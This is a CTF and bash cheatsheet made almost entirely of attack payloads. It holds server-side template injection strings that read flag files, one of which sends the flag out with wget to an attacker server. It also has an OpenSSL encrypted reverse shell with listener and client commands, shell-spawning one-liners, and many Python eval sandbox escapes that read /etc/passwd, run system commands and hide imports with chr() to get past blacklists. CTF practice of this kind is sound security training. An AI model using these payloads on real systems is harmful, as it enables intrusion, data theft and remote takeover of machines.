# Bash And CTF Cheatsheet

## Server Side Template Injection
```
{{()}}
{{''}}
{{ globals }}
{{ dict }}
{{ range }}
{{ self.__dict__ }}
{{ get_flashed_message.__globals__ }}

list(list(''.__reduce__(42).__getitem__(0).__globals__.values()).__getitem__(1).
values()).__getitem__(125)("/flag").read() # maybe tornado
dict(b=globals).get('b')().pop('__buil''tins__').pop('op''en')('/flag').read() # maybe tornado
globals().__getitem__('__bui''ltins__').__getitem__('op''en')('/flag').read() # maybe tornado
## source : https://spyclub.tech/2018/inctf2018-web-challenge-writeup/

bash
{{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}

# Tornado : https://ctftime.org/writeup/11519
{{globals.__self__.exec("imp"+"ort o"+"s;o"+"s.system('cat /flag|xa"+"rgs wget http://my_server 80 --user-agent')")}}

```


## Bash Hack

### Bashfuck
Executing command without using alphanum characters

[BasFuck](https://github.com/trichimtrich/bashfuck)

### Socat

```bash
socat -d -d -d TCP4-LISTEN:1337,reuseaddr,fork EXEC:"python pwn.py" > /dev/null 2>&1 &
```

### Shellcode Extractor

```bash
objdump -d ./orww|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
Source : [http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/](http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/) 

### Reverse SSL shell openssl - @ThemsonMester

Before the listener can be started, a key pair and a certificate must be generated.

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

#### Listener
```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```

#### Shell
```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
```
Source : [https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c](https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c)

### Spawn("/bin/bash") if no python installed

No python installed for the 'pty.spawn("/bin/bash")' trick? Can use expect or script as well :D

#### Script
```bash
SHELL=/bin/bash script -q /dev/null
```

#### expect
```bash
expect -c 'spawn bash; interact'
```
Source : [https://twitter.com/ropnop/status/884928178048860160](https://twitter.com/ropnop/status/884928178048860160)


### awk
```bash
awk 'BEGIN {system("/bin/bash")}'
```

## Python eval payload

i
```python
print('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
exit()
sum(xrange(-999999999,99999999))
 
file('/etc/passwd').read()
open('/etc/passwd').read()
__import__['fileinput'].input('/etc/passwd')
__import__['os'].system('cat /etc/passwd')
__import__['os'].popen('/etc/passwd', 'r').read()
__import__['os'].system('cd /; python -m SimpleHTTPServer')
 
print(file('/etc/passwd').read())
print(open('/etc/passwd').read())
print(__import__['fileinput'].input('/etc/passwd'))
print(__import__['os'].system('cat /etc/passwd'))
print(__import__['os'].popen('/etc/passwd', 'r').read())
print(__import__['os'].system('cd /; python -m SimpleHTTPServer'))
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']('THIS IS A PYTHON EVAL INTERPRETED OUTPUT')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['exit']()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['sum']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['xrange'](-999999999,99999999))
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read()
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer')
 
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['file']('/etc/passwd').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/etc/passwd').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('fileinput').input('/etc/passwd'))
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /etc/passwd'))
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('/etc/passwd', 'r').read())
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['print']([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cd /; python -m SimpleHTTPServer'))

# If system or popen or __import__ is blacklisted

[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('pty).spawn('sh')

[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('subprocess').check_output('ls')

## https://github.com/flawwan/CTF-Writeups/blob/master/inCTF2018/secure-file-uploader.md
getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()[40]('flag').read()
```
source : [https://www.floyd.ch/?p=584](https://www.floyd.ch/?p=584) 

## 
